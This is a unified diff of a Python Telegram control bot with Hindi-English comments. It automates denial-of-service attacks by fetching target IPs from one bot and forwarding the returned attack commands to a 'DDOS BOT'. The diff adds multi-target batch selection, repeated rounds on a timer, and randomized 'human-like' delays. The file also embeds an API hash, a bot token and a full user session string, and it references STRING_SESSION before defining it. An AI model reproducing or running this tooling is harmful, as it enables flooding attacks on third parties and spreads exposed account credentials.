@@ -1,12 +1,24 @@
 import asyncio
 import re
 import random
+from typing import Dict, List, Set
+
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
 
-from telegram import Update
-from telegram.ext import Application, CommandHandler, ContextTypes
+from telegram import (
+    Update,
+    InlineKeyboardButton,
+    InlineKeyboardMarkup,
+)
+from telegram.ext import (
+    Application,
+    CommandHandler,
+    CallbackQueryHandler,
+    ContextTypes,
+)
 
+# ===== TELETHON + BOT CONFIG (tumhare values) =====
 API_ID = 35284354
 API_HASH = "1369f6f5653d5589b735def06a23703c"
 BOT_TOKEN = "8489391478:AAFn0e-HJplScgnrZ5YH0f2Gc8Q1KO9VeyQ"
@@ -14,25 +26,24 @@ BOT_TOKEN = "8489391478:AAFn0e-HJplScgnrZ5YH0f2Gc8Q1KO9VeyQ"
 BOT_A = "@botbysahilbot"          # IP BOT
 BOT_B = "@DDOS_Aditya_xd_bot"     # Attack BOT
 
+tele = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)
+tele = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)
 STRING_SESSION = "1BVtsOKEBuwrK8qxvmy15Glw3WMpdO6sLWyYPWJrT_srehGTLqvYQ-h79-TY6GRqf9JfkAHjjzeN2HK-EWRJBlZnep2DpbOSNaqnDGQr3vjlGK9HY42PNWQWopuw-NKZcFYkQkL5aTNmhLw9oIgj0Yv1dCxEVIsK1RlDz8MeV3gw3NOOBO_ugSSiNwQWm9p-LLxDNirZrGBHsPu6ldDZx3ugqYbjqq1lZqBX30-VA_iPxbe-tCfHAJYAuKFsgH17iB-Q5f4HsKYQWGqx2ifgnDXsZhbtlfj7SkU16c4GJzicV9fuKMcJLhjbC2Gt48chDdtShhyBilakU0beFCt4EhgyAxccsPUI="
 
 tele = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)
 
-# --------- STATE ---------
+# ===== STATE =====
+saved_targets: Dict[int, List[str]] = {}     # har user ke saved chats
+selected_indexes: Dict[int, Set[int]] = {}   # /listchats ke checkboxes
+multi_targets: Dict[int, List[str]] = {}     # selected targets order me
+chat_counts: Dict[int, int] = {}             # autoloop count
 
-chat_targets: dict[int, str] = {}        # current target per TG chat
-chat_counts: dict[int, int] = {}
-saved_targets: dict[int, list[str]] = {} # multiple saved links/ids per TG chat
-
-ip_waiters: dict[int, asyncio.Future] = {}
-bot_b_status = "UNKNOWN"
-
-auto_tasks: dict[int, asyncio.Task] = {}
-BASE_DELAY = 70   # har attack ke baad fixed 70s wait
+ip_waiters: Dict[int, asyncio.Future] = {}   # IP BOT reply wait
+auto_tasks: Dict[int, asyncio.Task] = {}     # autoloop task per chat
+BASE_DELAY = 70                               # fixed delay (s) autoloop ke liye
 
 
-# ---------- HELPERS (human-like) ----------
-
+# ===== HELPERS =====
 async def human_sleep(min_s: float, max_s: float):
     await asyncio.sleep(random.uniform(min_s, max_s))
 
@@ -43,8 +54,7 @@ async def human_type_and_send(context: ContextTypes.DEFAULT_TYPE, chat_id: int, 
     await context.bot.send_message(chat_id, text)
 
 
-# ---------- LISTENERS ----------
-
+# ===== TELETHON LISTENERS =====
 @tele.on(events.NewMessage(from_users=BOT_A))
 async def ip_bot_listener(event):
     text = event.text or ""
@@ -72,55 +82,29 @@ async def ip_bot_listener(event):
 
     await human_sleep(0.4, 1.2)
 
+    # jo bhi control chat ip_wait kar raha hai use result do
     for chat_id, fut in list(ip_waiters.items()):
         if not fut.done():
             fut.set_result(final_cmd)
         ip_waiters.pop(chat_id, None)
 
 
-@tele.on(events.NewMessage(from_users=BOT_B))
-async def bot_b_listener(event):
-    global bot_b_status
-    text = event.text or ""
-    low = text.lower()
-    print("DDOS BOT MSG:", repr(text))
-
-    if "ready" in low and ("no attack running" in low or "you can start a new attack" in low):
-        bot_b_status = "READY"
-    elif (
-        "attack started" in low
-        or "starting attack" in low
-        or "attack running" in low
-        or "ᴀᴛᴛᴀᴄᴋ sᴛᴀʀᴛᴇᴅ" in text
-        or "sᴛᴀʀᴛɪɴɢ ᴀᴛᴛᴀᴄᴋ" in text
-        or "ᴀᴛᴛᴀᴄᴋ ʀᴜɴɴɪɴɢ" in text
-    ):
-        bot_b_status = "RUNNING"
-    elif "cooldown" in low or "⏳" in text:
-        bot_b_status = "COOLDOWN"
-
-
-# ---------- SINGLE ROUND ----------
-
-async def single_round(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
-    target = chat_targets.get(chat_id)
-    if not target:
-        await human_type_and_send(
-            context,
-            chat_id,
-            "❌ Pehle target set karo. /addchat se add karo, /listchats se dekho, /usetarget se select karo."
-        )
-        return
-
+# ===== CORE: SINGLE ROUND FOR ONE TARGET =====
+async def single_round_for_target(
+    control_chat_id: int,
+    context: ContextTypes.DEFAULT_TYPE,
+    target: str,
+) -> str | None:
+    """Ek target ke liye .getip, CMD return kare ya None (agar fail)."""
     await human_type_and_send(
         context,
-        chat_id,
-        f"➡️ Thoda ruk, `{target}` ka IP nikal raha hu…"
+        control_chat_id,
+        f"➡️ `{target}` ka IP nikal raha hu…",
     )
 
     loop = asyncio.get_running_loop()
     fut = loop.create_future()
-    ip_waiters[chat_id] = fut
+    ip_waiters[control_chat_id] = fut
 
     await human_sleep(0.8, 2.0)
     await tele.send_message(BOT_A, f".getip all {target}")
@@ -130,37 +114,66 @@ async def single_round(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
     except asyncio.TimeoutError:
         await human_type_and_send(
             context,
-            chat_id,
-            "⏱️ IP BOT reply nahi diya, ye attack skip kar raha hu."
+            control_chat_id,
+            f"⏱️ `{target}` se reply nahi aaya, skip kar diya.",
         )
-        ip_waiters.pop(chat_id, None)
+        ip_waiters.pop(control_chat_id, None)
+        return None
+
+    await human_type_and_send(
+        context,
+        control_chat_id,
+        f"📥 CMD mila `{target}` ke liye:`{final_cmd}`",
+    )
+    return final_cmd
+
+
+# ===== BATCH ROUND: MULTI‑TARGET QUEUE =====
+async def batch_round(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
+    targets = multi_targets.get(chat_id, [])
+    if not targets:
+        await human_type_and_send(
+            context,
+            chat_id,
+            "❌ Pehle /listchats khol ke buttons se targets select karo.",
+        )
         return
 
-    await human_type_and_send(
-        context,
-        chat_id,
-        f"📥 IP BOT ne ye CMD diya:`{final_cmd}`"
-    )
+    active_cmds: List[str] = []
 
-    await human_sleep(1.0, 3.0)
-    await tele.send_message(BOT_B, final_cmd)
+    # 1) sab selected targets ke liye CMD collect karo
+    for t in targets:
+        cmd = await single_round_for_target(chat_id, context, t)
+        if cmd:
+            active_cmds.append(cmd)
 
-    await human_type_and_send(
-        context,
-        chat_id,
-        f"🚀 DDOS BOT ko bhej diya:`{final_cmd}`"
-    )
+    if not active_cmds:
+        await human_type_and_send(
+            context,
+            chat_id,
+            "❌ Koi bhi active group nahi mila.",
+        )
+        return
+
+    # 2) CMDs ko line‑se BOT_B ko bhejna
+    for i, cmd in enumerate(active_cmds, start=1):
+        await human_type_and_send(
+            context,
+            chat_id,
+            f"🚀 {i}/{len(active_cmds)}: DDOS BOT ko bhej raha hu:`{cmd}`",
+        )
+        await tele.send_message(BOT_B, cmd)
+        await human_sleep(1.0, 3.0)
 
 
-# ---------- AUTO LOOP WORKER (fixed delay) ----------
-
+# ===== AUTOLOOP WORKER (batch_round ke upar) =====
 async def autoloop_worker(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
     count = chat_counts.get(chat_id, 1)
 
     await human_type_and_send(
         context,
         chat_id,
-        f"🔁 Auto loop start kar raha hu.Attacks: {count}Fixed delay: {BASE_DELAY}s har attack ke baad."
+        f"🔁 Auto loop start. Rounds: {count}, fixed delay: {BASE_DELAY}s.",
     )
 
     try:
@@ -168,47 +181,64 @@ async def autoloop_worker(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
             await human_type_and_send(
                 context,
                 chat_id,
-                f"▶️ Attack {i + 1}/{count} shuru karte hain…"
+                f"▶️ Round {i + 1}/{count} shuru…",
             )
 
-            await single_round(chat_id, context)
+            await batch_round(chat_id, context)
 
             if i == count - 1:
-                break  # last attack, ab delay nahi
+                break
 
             await human_type_and_send(
                 context,
                 chat_id,
-                f"⏳ Next attack se pehle {BASE_DELAY}s wait karunga…"
+                f"⏳ Next round se pehle {BASE_DELAY}s wait karunga…",
             )
-            await asyncio.sleep(BASE_DELAY)  # yahi fixed gap hai
+            await asyncio.sleep(BASE_DELAY)
 
     except asyncio.CancelledError:
         await human_type_and_send(
             context,
             chat_id,
-            "🛑 Auto loop force stop ho gaya (stop command se)."
+            "🛑 Auto loop force stop ho gaya.",
         )
         raise
     finally:
         auto_tasks.pop(chat_id, None)
-        await human_type_and_send(context, chat_id, "✅ Auto loop khatam ho gaya.")
+        await human_type_and_send(context, chat_id, "✅ Auto loop khatam.")
 
 
-# ---------- COMMAND HANDLERS ----------
+# ===== INLINE KEYBOARD HELPERS =====
+def build_keyboard(chat_id: int) -> InlineKeyboardMarkup:
+    lst = saved_targets.get(chat_id, [])
+    sel = selected_indexes.setdefault(chat_id, set())
+    keyboard: List[List[InlineKeyboardButton]] = []
 
+    for i, _ in enumerate(lst, start=1):
+        mark = "✅" if i in sel else "⬜"
+        keyboard.append([
+            InlineKeyboardButton(f"{mark} {i}", callback_data=f"toggle_{i}")
+        ])
+
+    keyboard.append([
+        InlineKeyboardButton("🟩 Select all", callback_data="select_all"),
+        InlineKeyboardButton("🚀 Start", callback_data="start_attack"),
+    ])
+    return InlineKeyboardMarkup(keyboard)
+
+
+# ===== COMMAND HANDLERS =====
 async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = """
-👋 Hey, main attack helper bot hu.
+👋 Attack helper bot.
 
 Commands:
-/addchat <link_or_chatid>        - Target list me add karo
-/listchats                       - Saved chats/IDs number ke sath dekho
-/usetarget <number>              - List me se current target select karo
-/setcount <number_of_attacks>    - Kitne attacks chahiye
-/startloop                       - Ek single attack
-/autoloop                        - Fixed delay ke sath auto attacks
-/stoploop                        - Auto loop turant band karo
+/addchat <link_or_chatid>     - Target list me add
+/listchats                    - Saved list + buttons
+/setcount <rounds>            - Kitne rounds (batch)
+/startloop                    - Ek batch round
+/autoloop                     - Multiple rounds with delay
+/stoploop                     - Auto loop band
 """
     await human_type_and_send(context, update.effective_chat.id, text.strip())
 
@@ -238,46 +268,75 @@ async def listchats(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("📭 Abhi koi saved chat/id nahi hai. /addchat use karo.")
         return
 
-    lines = []
+    selected_indexes.setdefault(chat_id, set())
+
+    lines = ["📚 Saved chats/IDs:"]
     for i, t in enumerate(lst, start=1):
-        lines.append(f"{i}. {t}")          # backticks hata diye, plain text
+        lines.append(f"{i}. {t}")
 
-    text = "📚 Saved chats/IDs:" + "".join(lines)
-    await update.message.reply_text(text)
+    text = "".join(lines)
+    reply_markup = build_keyboard(chat_id)
+    await update.message.reply_text(text, reply_markup=reply_markup)
 
-async def usetarget(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    chat_id = update.effective_chat.id
+
+async def on_list_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+
+    chat_id = query.message.chat_id
     lst = saved_targets.get(chat_id, [])
-
     if not lst:
-        await update.message.reply_text("❌ List khaali hai. Pehle /addchat se add karo.")
+        await query.edit_message_reply_markup(reply_markup=None)
         return
 
-    if not context.args or not context.args[0].isdigit():
-        await update.message.reply_text("Usage: /usetarget <number_from_/listchats>")
-        return
+    data = query.data
+    sel = selected_indexes.setdefault(chat_id, set())
 
-    idx = int(context.args[0])
-    if idx < 1 or idx > len(lst):
-        await update.message.reply_text("❌ Galat index. /listchats se sahi number dekho.")
-        return
+    if data.startswith("toggle_"):
+        idx = int(data.split("_")[1])
+        if 1 <= idx <= len(lst):
+            if idx in sel:
+                sel.remove(idx)
+            else:
+                sel.add(idx)
 
-    target = lst[idx - 1]
-    chat_targets[chat_id] = target
-    await update.message.reply_text(f"🎯 Current target set: `{target}`", parse_mode="Markdown")
+    elif data == "select_all":
+        if len(sel) == len(lst):
+            sel.clear()
+        else:
+            sel.update(range(1, len(lst) + 1))
+
+    elif data == "start_attack":
+        if not sel:
+            await query.answer("Koi chat select nahi ki.", show_alert=True)
+            return
+
+        targets = [lst[i - 1] for i in sorted(sel)]
+        multi_targets[chat_id] = targets
+
+        await query.message.reply_text(
+            "🎯 Selected targets:" + "".join(f"- {t}" for t in targets)
+        )
+        # ek batch round abhi turant chalao
+        asyncio.create_task(batch_round(chat_id, context))
+        return  # keyboard jaisa hai waisa rehne do
+
+    # toggle / select_all ke liye keyboard redraw
+    reply_markup = build_keyboard(chat_id)
+    await query.edit_message_reply_markup(reply_markup=reply_markup)
 
 
 async def setcount(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args or not context.args[0].isdigit():
-        await update.message.reply_text("Usage: /setcount <number_of_attacks>")
+        await update.message.reply_text("Usage: /setcount <rounds>")
         return
     n = max(1, int(context.args[0]))
     chat_counts[update.effective_chat.id] = n
-    await human_type_and_send(context, update.effective_chat.id, f"✅ Attack count {n} set kar diya.")
+    await human_type_and_send(context, update.effective_chat.id, f"✅ Rounds set: {n}")
 
 
 async def startloop(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await single_round(update.effective_chat.id, context)
+    await batch_round(update.effective_chat.id, context)
 
 
 async def autoloop(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -305,8 +364,7 @@ async def stoploop(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("ℹ️ Is chat me koi auto loop nahi chal raha.")
 
 
-# ---------- MAIN ----------
-
+# ===== MAIN =====
 async def main():
     await tele.start()
     print("🧵 Telethon connected")
@@ -315,17 +373,18 @@ async def main():
     app.add_handler(CommandHandler("start", start_cmd))
     app.add_handler(CommandHandler("addchat", addchat))
     app.add_handler(CommandHandler("listchats", listchats))
-    app.add_handler(CommandHandler("usetarget", usetarget))
     app.add_handler(CommandHandler("setcount", setcount))
     app.add_handler(CommandHandler("startloop", startloop))
     app.add_handler(CommandHandler("autoloop", autoloop))
     app.add_handler(CommandHandler("stoploop", stoploop))
+    app.add_handler(CallbackQueryHandler(on_list_callback))
 
     print("🤖 Control bot running")
     await app.initialize()
     await app.start()
     await app.updater.start_polling()
 
+    # Telethon loop
     await tele.run_until_disconnected()
 
 
